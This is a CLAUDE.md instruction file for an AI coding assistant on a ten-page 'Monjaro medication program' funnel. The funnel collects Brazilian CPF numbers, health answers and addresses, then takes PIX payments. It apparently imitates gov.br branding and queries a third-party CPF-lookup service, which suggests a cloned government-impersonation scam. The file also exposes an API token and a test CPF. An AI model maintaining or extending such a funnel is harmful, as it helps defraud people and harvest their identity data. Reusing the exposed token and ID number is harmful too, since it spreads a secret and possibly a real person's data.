# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

This is a multi-page HTML landing page and sales funnel for the Monjaro (tirzepatida) medication distribution program. It's a static site that captures leads through a 10-step workflow from landing page to payment confirmation, with CPF validation via external API.

**Important**: All tracking scripts (Facebook Pixel, Microsoft Clarity, DevTools blockers) have been removed. The project is clean and privacy-focused.

## Development Setup

### Running the Server

**CRITICAL**: Always use the Python proxy server to avoid CORS errors:

```bash
cd "/home/blacklotus/Downloads/OFERTA MONJARO"
python3 proxy_api.py
```

Then access: `http://localhost:8000/`

**Never** use `python3 -m http.server` - it doesn't handle CORS for the API calls.

### Testing CPF Validation

Test CPF: `046.891.496-07`

The API token is already configured in `validar-dados/index.html` and proxied through `proxy_api.py`.

## Architecture

### Sales Funnel Flow (10 Pages)

The user journey follows this strict sequence:

1. **index.html** - Landing page introducing the program
2. **cadastro/** - CPF capture form
3. **validar-dados/** - CPF validation against government API
4. **validacao-em-andamento/** - Loading screen (3s timeout)
5. **questionario-saude/** - Health eligibility questionnaire
6. **endereco/** - Address collection (with CEP lookup)
7. **selecao/** - Medication dosage selection
8. **solicitacao/** - Order review before payment
9. **pagamento_pix/** - PIX payment with QR code
10. **obrigado/** - Success confirmation page

Each page redirects to the next automatically or on form submit. Data persists in localStorage.

### API Integration

**CPF Validation API**:
- Endpoint: `https://apidecpf.site/api-v1/consultas.php`
- Token: `e3bd2312d93dca38d2003095196a09c2` (in proxy_api.py)
- Proxied through: `/api/consultar-cpf?cpf=XXX`
- Handles CORS via local proxy

**Mock APIs** (return placeholder data):
- `/api/farmacias-por-ip` - Pharmacy list by IP
- `/api/ip-geo` - Geolocation data

### Proxy Server (proxy_api.py)

The Python proxy server solves three problems:
1. CORS issues with external API calls
2. Token security (token stays server-side)
3. Serves static files + handles API routes

Key routes:
- `GET /api/consultar-cpf?cpf=XXX` - Proxies to CPF API with token
- `GET /api/farmacias-por-ip` - Returns mock pharmacy data
- `GET /api/ip-geo` - Returns mock geolocation
- All other paths - Serves static files

### Data Persistence

All form data is stored in **localStorage**:

| Key | Content | Set By |
|-----|---------|--------|
| `cpf` | User's CPF | cadastro |
| `cpfData` | Full CPF validation data | validar-dados |
| `nomeCompleto` | Full name from API | validar-dados |
| `questionnaireData` | Health questionnaire responses | questionario-saude |
| `endereco_form_data` | Delivery address | endereco |
| `selected_dosage` | Medication dosage | selecao |
| `protocoloValidacao` | Validation protocol number | validar-dados |
| `utm_params` | UTM tracking parameters | All pages |

### Navigation & Redirects

All redirects use **relative URLs** (no domain hardcoded). The navigation chain is strictly linear - there's no way to skip steps without having the required data in localStorage.

Each page checks for required data before proceeding:
- If data missing → redirect to `/cadastro`
- If data present → allow progression

## Common Development Tasks

### Modifying the Funnel Flow

1. Update redirect logic in the affected page's `<script>` section
2. Update WORKFLOW.md to document the change
3. Test the entire flow from `index.html` to `obrigado/`

### Adding/Removing Form Fields

1. Update the HTML form in the relevant `/index.html`
2. Update the localStorage save logic in the form's submit handler
3. Update any pages that read that data for display
4. Document in WORKFLOW.md

### Changing API Integration

1. Edit `proxy_api.py` to add/modify API routes
2. Update the fetch() calls in the relevant page
3. Restart the proxy server
4. Document in CONFIGURACAO_API.md

### Debugging CORS Issues

Check:
1. Using `python3 proxy_api.py` (not http.server)
2. Accessing via `http://localhost:8000/` (not file://)
3. API routes are correctly proxied in `proxy_api.py`
4. Browser console (F12) for specific error messages

## Important Files

- **proxy_api.py** - Required server with CORS handling and API proxy
- **validar-dados/index.html** - Contains CPF API integration logic
- **WORKFLOW.md** - Complete documentation of the 10-page flow
- **NAVEGACAO_COMPLETA.md** - Visual navigation map
- **CONFIGURACAO_API.md** - API integration details
- **SERVIDOR_PROXY.md** - Proxy server documentation

## JavaScript Utilities

Key JS files (in `index_files/` subdirectories):
- **common.js** - Shared utilities (form validation, localStorage helpers)
- **util.js** - Page-specific utilities
- **pharmacy_api_client.js** - Pharmacy API integration (in selecao/)

## Design System

- Font: Rawline (official gov.br font)
- Primary color: `#1351b4` (gov.br blue)
- Framework: Tailwind CSS (via CDN)
- Icons: Font Awesome
- Responsive: Mobile-first design

## Known Issues & Limitations

1. **Font 404s**: Rawline font files return 404 but fallback fonts work fine - not critical
2. **No Backend**: This is a static site - localStorage is the only persistence
3. **Security**: API token is in proxy_api.py - for production, use proper backend with env vars
4. **Mock APIs**: `/api/farmacias-por-ip` and `/api/ip-geo` return placeholder data

## Testing Checklist

Before committing changes:
- [ ] Start server with `python3 proxy_api.py`
- [ ] Test complete funnel from landing to obrigado page
- [ ] Verify CPF validation works with test CPF
- [ ] Check browser console for CORS/API errors
- [ ] Test on mobile viewport
- [ ] Verify localStorage data persists between pages
- [ ] Check all redirects work correctly

## Production Deployment

This is a **development/demo project**. For production:
1. Implement proper backend (Node.js/Django/Flask)
2. Move API token to environment variables
3. Add rate limiting and authentication
4. Implement proper database instead of localStorage
5. Use HTTPS everywhere
6. Add input validation and sanitization
7. Review all external links and neutralize if needed

## Documentation Structure

- **README.md** - Project overview and statistics
- **WORKFLOW.md** - Detailed page-by-page flow
- **NAVEGACAO_COMPLETA.md** - Navigation map with table
- **CONFIGURACAO_API.md** - API setup and testing
- **SERVIDOR_PROXY.md** - Proxy server details and troubleshooting
- **INICIO_RAPIDO.md** - Quick start guide (3 steps)
- **RELATORIO_LIMPEZA.md** - Tracking removal report